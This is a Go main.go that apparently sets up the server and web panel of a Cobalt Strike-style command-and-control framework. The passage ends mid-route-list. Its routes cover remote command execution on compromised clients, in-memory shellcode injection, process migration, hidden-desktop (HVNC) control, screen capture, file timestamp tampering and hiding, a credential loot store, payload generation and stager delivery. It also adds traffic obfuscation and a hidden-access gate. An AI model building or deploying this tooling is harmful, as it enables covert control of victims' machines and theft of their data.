//go:build !debug
// +build !debug

package main

import (
	"net/http"
	"runtime/debug"
	"BackendTemplate/pkg/api"
	"BackendTemplate/pkg/audit"
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/c2profile"
	"BackendTemplate/pkg/cna"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/connection/tcp"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/errors"
	"BackendTemplate/pkg/handlers"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/proxy"
	"BackendTemplate/pkg/security"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"context"
	"embed"
	"flag"
	"fmt"
	"html/template"
	"io/fs"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/gin-gonic/gin"
)

//go:embed dist
var embedFS embed.FS

func main() {
	// 调试用 pprof(设置环境变量 TSHELL_PPROF=1 启用,默认关闭不暴露)
	if os.Getenv("TSHELL_PPROF") == "1" {
		go func() {
			_ = http.ListenAndServe("127.0.0.1:6060", nil)
		}()
	}
	// OOM 防护:Go 内存软限制(2GB) + 周期 GC/trim 空闲 heap 归还 OS。
	// GenServer 生成大载荷(≈90MB×N 瞬时分配)会让 Go runtime 保留高水位 arena,
	// 在低内存容器(9.4GB)中被 OOM killer 误杀;FreeOSMemory 定时强制回收空闲页。
	debug.SetMemoryLimit(2 << 30)
	go func() {
		for {
			time.Sleep(20 * time.Second)
			debug.FreeOSMemory()
		}
	}()

	utils.InitFunction()
	gin.SetMode(gin.ReleaseMode)

	// 定期清理超时的下载文件句柄（客户端断线/完成后 120s 无活动自动关闭）
	go func() {
		for {
			time.Sleep(60 * time.Second)
			command.VarDownloadFiles.CleanupExpired()
		}
	}()

	// 初始化配置管理系统
	var configFile = flag.String("config", "config.yaml", "配置文件路径")
	var bindPort = flag.Int("p", 8089, "Specify alternate port")
	flag.Parse()

	// 加载配置
	if err := config.InitGlobalConfig(*configFile); err != nil {
		fmt.Printf("配置系统初始化失败: %v\n", err)
		os.Exit(1)
	}

	// 日志级别：debug|info|warn|error（服务端输出内容开关）
	appConfig := config.GetGlobalConfig()
	logx.SetLevel(logx.ParseLevel(appConfig.Logging.Level))
	// 【安全修复】白名单由配置驱动：私网段不再默认全量豁免（防内网爆破），
	// 仅回环 + security.whitelist_ips 显式声明条目豁免限流；强制模式同步配置
	security.GlobalRateLimiter.RebuildWhitelist(appConfig.Security.WhitelistIPs)
	security.WhitelistEnforced = appConfig.Security.EnableIPWhitelist
	// 客户端默认心跳间隔（client.sleep，监听器未指定时使用）
	if appConfig.Client.Sleep > 0 {
		database.DefaultClientSleep = strconv.Itoa(appConfig.Client.Sleep)
	}
	if *bindPort == 8089 { // 如果使用默认值，则使用配置文件中的端口
		*bindPort = appConfig.Server.Port
	}
	if *bindPort > 65535 || *bindPort < 0 {
		flag.Usage()
		os.Exit(0)
	}
	// 初始化流量混淆器
	var err error
	err = security.InitTrafficObfuscator()
	if err != nil {
		fmt.Printf("流量混淆器初始化失败: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("✅ 流量混淆器初始化成功")

	// 初始化JWT管理器
	err = security.InitJWTManager(2048, 24*time.Hour) // 2048位RSA密钥，24小时轮换
	if err != nil {
		fmt.Printf("JWT管理器初始化失败: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("✅ JWT管理器初始化成功")

	// 初始化安全密钥管理器
	err = encrypt.InitSecureKeyManager()
	if err != nil {
		fmt.Printf("安全密钥管理器初始化失败: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("✅ 安全密钥管理器初始化成功")

	// 会话密钥派生盐上下文:从配置文件读取(生成客户端时 patch 进二进制,两端一致)
	encrypt.SessionKeyInfoProvider = func() string {
		if g := config.GetGlobalConfig(); g != nil && g.Security.SessionKeyInfo != "" {
			return g.Security.SessionKeyInfo
		}
		return "8d2c91f4a6"
	}

	// 初始化用户管理器（需要在数据库初始化之前）
	err = config.InitUserManager()
	if err != nil {
		fmt.Printf("用户管理器初始化失败: %v\n", err)
		os.Exit(1)
	}

	// 初始化隐藏访问管理器
	security.InitHiddenAccessManager(
		appConfig.Auth.EnableHiddenAccess,
		appConfig.Auth.HiddenAccessConfig.AccessPaths,
		appConfig.Auth.HiddenAccessConfig.ParamNames,
		appConfig.Auth.HiddenAccessConfig.SecretKey,
		appConfig.Auth.HiddenAccessConfig.SessionTTL,
	)

	// 【安全告警】弱隐藏访问密钥检测
	if appConfig.Auth.EnableHiddenAccess {
		key := appConfig.Auth.HiddenAccessConfig.SecretKey
		weakKeys := []string{"12345", "admin", "password", "123456", "test", "key"}
		weak := key == "" || len(key) < 8
		for _, w := range weakKeys {
			if strings.EqualFold(key, w) {
				weak = true
				break
			}
		}
		if weak {
			fmt.Println("⚠️⚠️⚠️ [安全警告] 隐藏访问密钥过弱或为空，/?key= 入口极易被猜解！")
			fmt.Printf("⚠️⚠️⚠️ 当前密钥: %q，请立即通过 安全设置 → 隐藏访问 重新生成强密钥\n", key)
		}
	}

	// 初始化带宽监控器
	api.InitBandwidthMonitor()
	fmt.Println("✅ 带宽监控器初始化成功")
	// P1-2B: 仪表盘后台预采（10s 周期，连接数 30s）
	api.InitDashboardCollector()

	database.ConnectDateBase()
	defer database.Engine.Close()

	// 初始化统一离线检测器（B13: 替代各协议 duplicated 的 checkHeartbeats）
	connection.InitOfflineDetector()

	// 启动批量任务记录 TTL 清理（防止内存无界增长）
	api.StartTaskCleanup()
	// 任务队列可视化:命令历史 TTL 清理
	go func() {
		t := time.NewTicker(5 * time.Minute)
		defer t.Stop()
		for range t.C {
			command.GlobalCmdHistory.CleanupExpired()
		}
	}()

	// 从配置文件初始化默认管理员用户
	err = database.InitializeDefaultUserFromConfig(
		appConfig.Auth.DefaultUsername,
		appConfig.Auth.DefaultPassword,
	)
	if err != nil {
		fmt.Printf("初始化默认管理员用户失败: %v\n", err)
		// 不退出，继续启动，但记录警告
	} else {
		fmt.Printf("✅ 管理员用户初始化成功：%s\n", appConfig.Auth.DefaultUsername)
	}

	// 初始化审计日志系统
	err = audit.InitAuditLogger("./logs", 100*1024*1024, 30) // 100MB, 30天
	if err != nil {
		fmt.Printf("审计日志系统初始化失败: %v\n", err)
		os.Exit(1)
	}
	defer audit.GlobalAuditLogger.Close()
	fmt.Println("✅ 审计日志系统初始化成功")

	// 初始化连接池管理器
	err = connection.InitializeConnectionManager(connection.DefaultPoolConfig)
	if err != nil {
		fmt.Printf("连接池管理器初始化失败: %v\n", err)
		os.Exit(1)
	}
	defer connection.GlobalConnectionManager.Close()

	// 初始化内存优化器
	err = connection.InitMemoryOptimizer(nil) // 使用默认配置
	if err != nil {
		fmt.Printf("内存优化器初始化失败: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("✅ 内存优化器初始化成功")

	// 初始化工作池
	err = connection.InitializeWorkerPool(0, 0) // 使用默认值
	if err != nil {
		fmt.Printf("工作池初始化失败: %v\n", err)
		os.Exit(1)
	}
	defer connection.StopGlobalWorkerPool()

	// 初始化隧道管理器
	proxy.InitTunnelManager()
	fmt.Println("✅ 隧道管理器初始化成功")

	// 设置TCP连接到隧道管理器的回调函数
	tcp.RegisterTunnelConnection = func(uid string, conn net.Conn) {
		if proxy.GlobalTunnelManager != nil {
			proxy.GlobalTunnelManager.RegisterClientConnection(uid, conn)
		}
	}
	tcp.UnregisterTunnelConnection = func(uid string) {
		if proxy.GlobalTunnelManager != nil {
			proxy.GlobalTunnelManager.UnregisterClientConnection(uid)
		}
	}
	fmt.Println("✅ TCP隧道连接回调函数已设置")

	// P3-1: 注入密钥轮换下发回调（encrypt 包不依赖 sendcommand，避免循环依赖；
	// 轮换消息 type=5|nonce 经命令链路按客户端协议加密下发）
	encrypt.KeyRotationSender = func(clientID string, payload []byte) {
		sendcommand.SendFileUploadCommand(clientID, payload)
	}
	fmt.Println("✅ 密钥轮换下发回调已设置")

	// CNA 脚本引擎初始化（Aggressor Script 兼容子集）
	// 回调注入：sendcommand 依赖 command 包，这里在 main 层桥接避免包依赖环
	api.InitCnaBridge()
	// C2 Profile 管理器（profiles/*.yaml，热重载）
	if err := c2profile.InitNoWatch(""); err != nil {
		fmt.Printf("⚠️ C2 Profile 初始化失败: %v\n", err)
	} else {
		fmt.Println("✅ C2 Profile 管理器初始化成功")
	}
	cna.ExecFunc = sendcommand.SendCommand
	// 控制台 inject 命令分发：按客户端监听器动态生成 shellcode 并内存注入
	sendcommand.InjectMemDispatcher = api.DispatchInject
	// 订阅客户端上线事件：触发 cna beacon_initial 事件（tcp/ws/kcp/http 各协议统一入口）
	if command.GlobalEventBus != nil {
		go func() {
			ch := command.GlobalEventBus.Subscribe()
			for ev := range ch {
				if ev.Type == command.EventClientOnline && ev.UID != "" {
					cna.Global.FireClientEvent("beacon_initial", ev.UID, ev.Detail)
				}
			}
		}()
	}
	fmt.Println("✅ CNA 脚本引擎初始化成功")

	// 初始化通知管理器
	notification.InitNotificationManager()
	// 启动通知记录清理例程（防 lastNotifications map 无界增长）
	if nm := notification.GetNotificationManager(); nm != nil {
		nm.StartCleanupRoutine()
	}
	fmt.Println("✅ 通知管理器初始化成功")

	database.Engine.Update(&database.Clients{Online: "2"})

	// 监听器不随服务重启自动恢复：重启即自动对外开放 C2 监听端口风险更高，故统一置停，
	// 由操作员手动启动（WebDelivery 相反——它保留 status=1 由 Delivery Hub 恢复）。
	// 但要先把原本在跑的列出来，否则操作员只看到"全部已停止"，不知道重启前有哪些在跑。
	var listenersRunningBeforeRestart []database.Listener
	if err := database.Engine.Where("status = ?", 1).Find(&listenersRunningBeforeRestart); err != nil {
		fmt.Printf("⚠️ 读取重启前监听器状态失败: %v\n", err)
	}
	database.Engine.Update(&database.Listener{Status: 2})
	if n := len(listenersRunningBeforeRestart); n > 0 {
		fmt.Printf("⚠️ 已置停 %d 个监听器（不自动恢复，需手动启动）：\n", n)
		for _, lis := range listenersRunningBeforeRestart {
			fmt.Printf("   %s://%s\n", lis.Type, lis.ListenAddress)
		}
	}

	// WebDelivery 不再整体置关闭：由 Delivery Hub 按库中 status=1 记录恢复
	delivery.GlobalHub.SetMainPort(*bindPort)

	// SOCKS5代理功能已删除

	r := gin.New()

	// 添加错误处理中间件
	r.Use(errors.Recovery())
	r.Use(errors.RequestIDMiddleware())
	r.Use(errors.TimestampMiddleware())
	r.Use(errors.ErrorHandlerMiddleware())
	// J9: 全局请求体大小限制（10MB，防超大 JSON 内存 DoS）
	r.Use(errors.MaxBodyBytesMiddleware(10 * 1024 * 1024))

	// 添加审计日志中间件
	r.Use(audit.AuditMiddleware())

	// 添加安全中间件
	r.Use(security.HiddenAccessMiddleware()) // 隐藏访问保护（放在所有中间件最前面）
	r.Use(security.RequestLoggerMiddleware())
	r.Use(security.SecurityHeadersMiddleware())
	// 【修复】注册 IP 白名单中间件（默认放行模式，启用 WhitelistEnforced 后强制拦截）
	r.Use(security.IPWhitelistMiddleware())
	r.Use(security.APIRateLimitMiddleware())

	// 配置 CORS
	r.Use(Cors())

	// 创建嵌入文件系统
	distFS, _ := fs.Sub(embedFS, "dist")
	staticFs, _ := fs.Sub(distFS, "static")

	// P1-2D: 静态资源长缓存（/static /css /js /img → immutable 1y，index.html no-cache 已在 NoRoute/GET / 处理）
	r.Use(func(c *gin.Context) {
		p := c.Request.URL.Path
		if strings.HasPrefix(p, "/static/") || strings.HasPrefix(p, "/css/") || strings.HasPrefix(p, "/js/") || strings.HasPrefix(p, "/img/") {
			c.Header("Cache-Control", "public, max-age=31536000, immutable")
		}
		c.Next()
	})

	// 提供静态文件路由
	r.StaticFS("/static/", http.FS(staticFs))

	// 为前端构建产物添加直接访问路由
	cssFS, _ := fs.Sub(distFS, "css")
	jsFS, _ := fs.Sub(distFS, "js")
	imgFS, _ := fs.Sub(distFS, "img")

	r.StaticFS("/css/", http.FS(cssFS))
	r.StaticFS("/js/", http.FS(jsFS))
	r.StaticFS("/img/", http.FS(imgFS))

	// 引入html
	r.SetHTMLTemplate(template.Must(template.New("").ParseFS(embedFS, "dist/*.html")))

	// 处理根路径
	r.GET("/", func(c *gin.Context) {
		// 检查是否已登录
		tokenCookie, err := c.Cookie("access_token")
		if err == nil && tokenCookie != "" {
			// 验证token
			_, err = security.GlobalJWTManager.ValidateToken(tokenCookie)
			if err == nil {
				// token有效，重定向到dashboard
				c.Redirect(http.StatusTemporaryRedirect, "/dashboard")
				return
			}
		}
		// 没有有效token，显示登录页面
		c.HTML(http.StatusOK, "index.html", nil)
	})

	// 处理未匹配的路由，支持Vue Router的history模式
	r.NoRoute(func(c *gin.Context) {
		path := c.Request.URL.Path
		// 如果是API请求，返回404
		if strings.HasPrefix(path, "/api/") {
			c.JSON(http.StatusNotFound, gin.H{"error": "API endpoint not found"})
			return
		}
		// Delivery Hub 公开路径未命中时返回 404（不回落前端 HTML）
		if strings.HasPrefix(path, "/d/") || strings.Contains(path, "/d/") {
			c.Status(http.StatusNotFound)
			return
		}
		// 如果是静态资源请求但文件不存在，返回404
		if strings.HasPrefix(path, "/static/") || strings.HasPrefix(path, "/css/") ||
			strings.HasPrefix(path, "/js/") || strings.HasPrefix(path, "/img/") {
			c.Status(http.StatusNotFound)
			return
		}

		// 公开路由列表（不需要JWT验证的页面）
		publicRoutes := []string{"/login", "/", "/favicon.ico"}
		isPublicRoute := false
		for _, route := range publicRoutes {
			if path == route {
				isPublicRoute = true
				break
			}
		}

		// 如果不是公开路由，需要验证JWT token
		if !isPublicRoute {
			// 检查Cookie中的token
			tokenCookie, err := c.Cookie("access_token")
			if err != nil || tokenCookie == "" {
				// 没有token，重定向到登录页
				c.Redirect(http.StatusTemporaryRedirect, "/login")
				return
			}

			// 验证token
			_, err = security.GlobalJWTManager.ValidateToken(tokenCookie)
			if err != nil {
				// token无效，重定向到登录页
				c.Redirect(http.StatusTemporaryRedirect, "/login")
				return
			}
		}

		// 其他路径返回index.html，支持前端路由
		c.HTML(http.StatusOK, "index.html", nil)
	})
	a := r.Group("/api")
	// 为登录相关的API添加特殊的安全中间件
	a.Use(security.LoginRateLimitMiddleware(), security.BruteForceProtectionMiddleware(), audit.LoginAuditMiddleware())
	// 添加UTF-8编码中间件，确保中文正常显示
	a.Use(security.UTF8EncodingMiddleware())
	{
		// 登录
		a.POST("/users/login", api.LoginHandler)
	}
	// 【修复】refresh 走独立分组：合法客户端 1 分钟内刷新 >5 次会被登录限流误封 15 分钟，
	// refresh 令牌轮换请求属于正常高频操作，不应计入登录尝试
	refreshGroup := r.Group("/api")
	refreshGroup.Use(security.UTF8EncodingMiddleware())
	{
		// 刷新令牌（宽松限流：仅受通用 API 限流保护）
		refreshGroup.POST("/users/refresh", api.RefreshTokenHandler)
	}

	// 受保护路由
	protected := r.Group("/api")
	// 在 JWT 中间件之前先做 Authorization2 头的健壮性校验
	protected.Use(SafeAuthHeaderGuard(), api.AuthMiddleware())
	// 添加UTF-8编码中间件，确保中文正常显示
	protected.Use(security.UTF8EncodingMiddleware())

	// Token 校验端点（所有登录用户）：仅返回认证状态与角色，无敏感配置。
	// 前端路由守卫用它校验 token——原用 /api/config/current（adminOnly），
	// operator/auditor 访问返回 403 → 前端误判 token 无效 → 切页即登出。
	protected.GET("/auth/check", api.AuthCheckHandler)

	// C13 RBAC：管理员专属路由组（密钥/安全配置/审计管理/用户口令/监听器管理）
	adminOnly := protected.Group("")
	adminOnly.Use(security.RequireRole(security.RoleAdmin))

	// 为文件操作 API 添加文件操作审计中间件
	fileAPI := protected.Group("")
	fileAPI.Use(audit.FileOperationAuditMiddleware())

	// 注销
	protected.POST("/users/logout", api.LogoutHandler)

	// 修改密码（任意登录用户改自己的密码）
	protected.POST("/users/user_setting/ChangePassword", api.ChangePasswordHandler)

	// 用户管理（仅 admin；用户列表/创建/删除/重置密码 —— 权限分离）
	adminOnly.POST("/users/user_setting/get_user_list", api.GetUserListHandler)
	adminOnly.POST("/users/user_setting/create_user", api.CreateUserHandler)
	adminOnly.POST("/users/user_setting/delete_user", api.DeleteUserHandler)
	adminOnly.POST("/users/user_setting/admin_reset_password", api.AdminResetPasswordHandler)

	// J8: 操作员路由组（admin + operator）——auditor(只读)不可执行任何客户端操作
	operatorOnly := protected.Group("")
	operatorOnly.Use(security.RequireRole(security.RoleAdmin, security.RoleOperator))

	// 【RBAC修复】文件变更操作（删除/上传/改写等）仅 admin+operator；
	// auditor 为只读角色，原挂在 fileAPI（全角色）下可执行破坏性文件操作
	operatorFile := operatorOnly.Group("")
	operatorFile.Use(audit.FileOperationAuditMiddleware())

	protected.GET("/client/clientslist", api.GetClients)
	operatorOnly.POST("/client/shell/sendcommand", api.SendCommands)
	protected.GET("/client/shell/getshellcontent", api.GetShellContent)
	protected.GET("/client/pid", api.GetPidList)
	operatorOnly.POST("/client/pid/kill", api.KillPid)
	fileAPI.POST("/client/file/tree", api.FileBrowse)
	fileAPI.POST("/client/file/search", api.FileSearch) // 递归文件搜索(结果复用 file/tree 格式)
	operatorFile.POST("/client/file/delete", api.FileDelete)
	operatorFile.POST("/client/file/mkdir", api.MakeDir)
	operatorFile.POST("/client/file/create", api.CreateFile)
	operatorFile.POST("/client/file/upload", api.FileUpload)
	protected.GET("/client/note/get", api.GetNote)
	protected.POST("/client/note/save", api.SaveNote)
	operatorFile.POST("/client/file/download", api.DownloadFile)
	fileAPI.GET("/client/downloads/info", api.GetDownloadsInfo)
	fileAPI.POST("/client/downloads/downloaded_file", api.DownloadDownloadedFile)
	operatorFile.DELETE("/client/downloads/delete", api.DeleteDownloadedFile)
	fileAPI.GET("/client/file/drives", api.ListDrives)
	// 新的文件编辑API
	fileAPI.POST("/client/file/edit/read", api.NewFileEditRead)
	operatorFile.POST("/client/file/edit/write", api.NewFileEditWrite)
	operatorFile.POST("/client/file/modifytime", api.ModifyFileTime)
	operatorFile.POST("/client/file/hide", api.HideFile)
	operatorFile.POST("/client/file/unhide", api.UnhideFile)
	operatorFile.POST("/client/file/rename", api.RenameFile)
	operatorFile.POST("/client/file/copy", api.CopyFile)
	operatorOnly.GET("/client/exit", api.ExitClient)
	operatorOnly.GET("/client/disconnect", api.DisconnectClient)
	protected.GET("/client/shell/history/:uid", api.GetShellContent)
	protected.POST("/client/addnote", api.AddUidNote)
	operatorOnly.POST("/client/sleep", api.EditSleep)
	protected.POST("/client/color", api.EditColor)
	// D41: 客户端生成（载荷）按监听器密钥构建客户端二进制——operator 可用。
	// 口径：GenServer 只读监听器密钥、不改写；与同样可改 VKey 的 /listener/update
	// 同级挂 operatorOnly；密钥管理/改写入口在 adminOnly 的 /key-management/*。
	// （GenServer 拒绝默认/空密钥见 J4。）
	operatorOnly.POST("/client/GenServer", api.GenServer)
	// Graph 关系图数据（CS Graph 页面）
	operatorOnly.GET("/graph/data", api.GetGraphData)
	operatorOnly.POST("/client/screenshot1", api.TakeScreenshot)
	operatorOnly.POST("/client/batch-delete", api.BatchDeleteClients)
	operatorOnly.POST("/client/reset-id", api.ResetClientId)
	operatorOnly.POST("/client/batch-command", api.BatchCommand)
	protected.GET("/client/tasks", api.ListTasks)
	protected.POST("/client/update-group", api.UpdateClientGroup)
	protected.POST("/client/batch-update-group", api.BatchUpdateClientGroup)
	protected.GET("/client/report/:uid", api.GetClientReport)
	// 报告补齐:威胁指标 / 社会工程 / 战术 TTP
	operatorOnly.GET("/report/ioc", api.GetIOCReport)
	operatorOnly.GET("/report/social", api.GetSocialReport)
	operatorOnly.GET("/report/ttp", api.GetTTPReport)
	// 任务队列可视化:单会话命令下发时间线
	operatorOnly.GET("/client/tasks/:uid", api.GetClientTaskQueue)
	operatorOnly.GET("/client/session-log", api.DownloadSessionLog)

	// 正向连接功能
	operatorOnly.POST("/client/forward-connect", api.ConnectForwardClient)

	// 基于休眠时间的智能检测API
	protected.POST("/client/smart-offline-check", api.SmartOfflineCheck)

	// Windows内存执行 API（tshell功能移植）
	operatorOnly.POST("/bin/execute", api.ExecuteBin)
	// 内存注入（纯内存通道，不落盘；替代原文件路径注入）
	operatorOnly.POST("/client/inject-mem", api.InjectMem)
	// 进程迁移（重上线式：重建同配置 beacon→donut→注入目标进程→原进程退出）
	operatorOnly.POST("/client/migrate", api.Migrate)

	// 屏幕监控功能（【RBAC修复】监控/截图属敏感操作，仅 admin+operator）
	operatorOnly.POST("/client/monitor/start", api.StartScreenMonitor)
	operatorOnly.POST("/client/monitor/stop", api.StopScreenMonitor)
	operatorOnly.GET("/client/monitor/frame", api.GetMonitorFrame)

	// HVNC 隐藏桌面（【RBAC修复】仅 admin+operator，auditor 只读不可操作）
	hvncAPI := operatorOnly.Group("/client/hvnc")
	{
		hvncAPI.POST("/start", api.StartHvnc)
		hvncAPI.POST("/stop", api.StopHvnc)
		hvncAPI.POST("/input", api.SendHvncInput)
		hvncAPI.GET("/frame", api.GetHvncFrame)
	}
	hvncWS := r.Group("/api/hvnc")
	{
		hvncWS.GET("/connect", api.HvncConnectHandler)
	}

	protected.GET("/client/listener/list", api.ShowListener)
	protected.GET("/client/listener/details", api.ShowListenerDetails)
	operatorOnly.POST("/listener/add", api.AddListener)
	protected.GET("/listener/list", api.ListListener)
	operatorOnly.POST("/listener/open", api.OpenListener)
	operatorOnly.POST("/listener/close", api.CloseListener)
	operatorOnly.POST("/listener/restart", api.RestartListener) // 断链修复:前端原有调用,后端补路由
	operatorOnly.POST("/listener/update", api.UpdateListener) // 添加更新监听器API
	operatorOnly.POST("/listener/delete", api.DeleteListener)
	operatorOnly.POST("/listener/batch-delete", api.BatchDeleteListeners)

	protected.GET("/webdelivery/list", api.ListWebDelivery)
	operatorOnly.POST("/webdelivery/start", api.StartWebDelivery)
	// 文件托管: 任意文件经 Delivery Hub /d/ 通道对外分发(复用其访问控制)
	operatorOnly.POST("/webdelivery/host-file", api.HostFileDelivery)
	operatorOnly.POST("/webdelivery/close", api.CloseWebDelivery)
	operatorOnly.POST("/webdelivery/open", api.OpenWebDelivery)
	operatorOnly.POST("/webdelivery/delete", api.DeleteWebDelivery)
	// StagerToken 门禁令牌（防盗门）：生成/列表/删除
	operatorOnly.POST("/webdelivery/token/create", api.CreateStagerToken)
	operatorOnly.GET("/webdelivery/token/list", api.ListStagerTokens)
	operatorOnly.POST("/webdelivery/token/delete", api.DeleteStagerToken)
	protected.GET("/webdelivery/commands", api.GetDeliveryCommands)
	protected.GET("/webdelivery/logs", api.GetDeliveryAccessLogs)
	protected.GET("/webdelivery/defaults", api.GetDeliveryDefaults)
	protected.POST("/webdelivery/preview-urls", api.PreviewDeliveryURLs)

	// Delivery Hub 公开投递路由（无需 JWT）：/d/{key}/full|stager|sc|woff
	// 同时注册 base_path 前缀（CDN 回源保留前缀时，如 /static/d/...）
	// r.Any 已覆盖 GET/POST/PUT/PATCH/HEAD/OPTIONS/DELETE，勿再单独注册 HEAD（会与 *filepath 冲突 panic）
	deliveryHandler := func(c *gin.Context) {
		delivery.GlobalHub.ServeHTTP(c.Writer, c.Request)
	}
	r.Any("/d/*filepath", deliveryHandler)
	if gcfg := config.GetGlobalConfig(); gcfg != nil {
		bp := strings.Trim(gcfg.Delivery.BasePath, "/")
		if bp != "" {
			// 注意：通配符参数名必须与已有路由一致（*filepath），且路径不能与 /d/*filepath 重复
			prefix := "/" + bp + "/d/*filepath"
			if prefix != "/d/*filepath" {
				r.Any(prefix, deliveryHandler)
				fmt.Println("Delivery Hub CDN prefix:", "/"+bp+"/d/{key}/...")
			}
		}
	}

	// 密钥管理相关功能
	keyManagement := adminOnly.Group("/key-management")
	{
		keyManagement.GET("/listener-config", api.GetListenerKeyConfig)
		keyManagement.GET("/all-configs", api.GetAllListenerKeyConfigs)
		keyManagement.POST("/update", api.UpdateListenerKeyConfig)
		keyManagement.POST("/reset/:address", api.ResetListenerKeyConfig)

		// 会话密钥状态 / 轮换 / 健康检查 / 统计 / 轮换配置
		// （handler 早已实现于 pkg/api/key_management.go，此前未挂路由）
		keyManagement.GET("/key-status", api.GetAllKeyStatus)
		keyManagement.GET("/key-status/:client_id", api.GetKeyStatus)
		keyManagement.POST("/rotate", api.ForceKeyRotation)
		keyManagement.POST("/health-check/:client_id", api.SendKeyHealthCheck)
		keyManagement.GET("/metrics", api.GetKeyMetrics)
		keyManagement.PUT("/rotation-config", api.ConfigureKeyRotation)
	}

	// SOCKS5代理相关功能
	// 【权限对齐 J8】读列表留 protected(全角色),写操作收紧 operator+
	// (原全部挂 protected——auditor 可启停代理,与"auditor 只读"口径不符)
	socks5 := protected.Group("/socks5")
	{
		socks5.GET("/list", api.Socks5List)
	}
	socks5Write := operatorOnly.Group("/socks5")
	{
		socks5Write.POST("/start", api.Socks5Start)
		socks5Write.POST("/open", api.Socks5Open)
		socks5Write.POST("/close", api.Socks5Close)
		socks5Write.POST("/delete", api.Socks5Delete)
		socks5Write.POST("/batch-delete", api.Socks5BatchDelete)
		socks5Write.PUT("/update", api.Socks5Update)
	}

	// 隧道代理管理API(权限口径同 socks5: 读 protected,写 operator+)
	tunnelAPI := protected.Group("/tunnel-proxy")
	{
		tunnelAPI.GET("/", api.GetTunnelProxyList)
	}
	tunnelWrite := operatorOnly.Group("/tunnel-proxy")
	{
		tunnelWrite.POST("/", api.CreateTunnelProxy)
		tunnelWrite.PUT("/:id", api.UpdateTunnelProxy)
		tunnelWrite.DELETE("/:id", api.DeleteTunnelProxy)
		tunnelWrite.POST("/:id/start", api.StartTunnelProxy)
		tunnelWrite.POST("/:id/stop", api.StopTunnelProxy)
	}

	// 安全管理相关路由
	securityAPI := adminOnly.Group("/security")
	{
		securityAPI.GET("/stats", security.GetSecurityStatsHandler)
		securityAPI.GET("/whitelist", security.GetWhitelistHandler)
		securityAPI.POST("/whitelist/add", security.AddToWhitelistHandler)
		securityAPI.DELETE("/whitelist/remove", security.RemoveFromWhitelistHandler)
		securityAPI.GET("/blocked-ips", security.GetBlockedIPsHandler)
		securityAPI.POST("/unblock/:ip", security.UnblockIPHandler)
		securityAPI.PUT("/rate-limit", security.UpdateRateLimitConfigHandler)
		securityAPI.GET("/realtime-stats", security.GetRealTimeStatsHandler)

		// 隐藏访问管理API
		securityAPI.GET("/hidden-access/status", security.GetHiddenAccessStatusHandler)
		securityAPI.PUT("/hidden-access/config", security.UpdateHiddenAccessConfigHandler)
		securityAPI.POST("/hidden-access/regenerate-key", security.RegenerateHiddenAccessKeyHandler)
		securityAPI.POST("/hidden-access/clear-sessions", security.ClearHiddenAccessSessionsHandler)
	}

	// 审计日志管理API
	auditAPI := adminOnly.Group("/audit")
	{
		auditAPI.GET("/logs", audit.GetAuditLogs)
		auditAPI.GET("/statistics", audit.GetAuditStatistics)
		auditAPI.GET("/export", audit.ExportAuditLogs)
		auditAPI.DELETE("/cleanup", audit.CleanupOldLogs)
	}

	// Loot 凭据/制品库(读:全部登录角色;写:operator+;凭据属敏感数据)
	lootRead := protected.Group("/loot")
	{
		lootRead.GET("", api.ListLoot)
	}
	lootWrite := operatorOnly.Group("/loot")
	{
		lootWrite.POST("", api.AddLoot)
		lootWrite.DELETE("/:id", api.DeleteLoot)
	}

	// 连接管理API
	connectionAPI := protected.Group("/connection")
	{
		connectionAPI.GET("/pool/stats", connection.GetConnectionPoolStats)
		connectionAPI.GET("/worker/stats", connection.GetWorkerPoolStats)
		connectionAPI.GET("/details", connection.GetConnectionDetails)
		connectionAPI.DELETE("/:id", connection.CloseConnection)
		connectionAPI.PUT("/pool/config", connection.UpdatePoolConfig)
		connectionAPI.PUT("/worker/resize", connection.ResizeWorkerPool)
		connectionAPI.GET("/protocol/:protocol", connection.GetConnectionsByProtocol)
		connectionAPI.POST("/health-check", connection.PerformHealthCheck)
		connectionAPI.GET("/uid/:uid", connection.GetConnectionByUID)
	}

	// 通知配置API
	notificationAPI := protected.Group("/notification")
	{
		notificationAPI.GET("/config", handlers.GetNotificationConfig)
		notificationAPI.POST("/config", handlers.UpdateNotificationConfig)
		notificationAPI.POST("/test", handlers.TestNotification)
	}

	// H5: 服务器本机 shell 终端已下线（原无 JWT 中间件 + 任意角色可在服务器执行任意命令 → 服务器 RCE）
	// Web 终端请使用 /api/shell/:uid（客户端交互式终端，首消息强制 JWT 认证）
	terminalWS := r.Group("/api/terminal")
	{
		terminalWS.GET("/connect", func(c *gin.Context) {
			c.JSON(http.StatusGone, gin.H{"error": "服务器本机终端已下线，请使用客户端 Web 终端"})
		})
	}

	// B11: 事件流 WebSocket（实时事件推送）
	eventsWS := r.Group("/api/events")
	{
		eventsWS.GET("/ws", api.EventsConnectHandler)
	}

	// XTerm.js WebSocket终端API - 专门用于XTerm.js前端终端组件
	xtermWS := r.Group("/api/xterm")
	{
		xtermWS.GET("/connect", api.XTermConnectHandler)
	}

	// Web终端API - 专门用于前端终端组件
	webTerminalWS := r.Group("/api")
	{
		webTerminalWS.GET("/shell/:uid", api.WebTerminalHandler)
	}

	// 其他终端API需要JWT认证
	terminalAPI := protected.Group("/terminal")
	{
		terminalAPI.GET("/list", func(c *gin.Context) {
			c.JSON(http.StatusGone, gin.H{"error": "服务器本机终端已下线"})
		})
		terminalAPI.DELETE("/close/:uid", func(c *gin.Context) {
			c.JSON(http.StatusGone, gin.H{"error": "服务器本机终端已下线"})
		})
	}

	// 配置管理API（D40: 仅管理员可访问——配置含隐藏访问密钥/通知凭证等敏感信息）
	configAPI := adminOnly.Group("/config")
	{
		configAPI.GET("/current", config.GetConfigHandler)
		configAPI.PUT("/update", config.UpdateConfigHandler)
		configAPI.POST("/reload", config.ReloadConfigHandler)
		configAPI.GET("/schema", config.GetConfigSchemaHandler)
		configAPI.POST("/validate", config.ValidateConfigHandler)
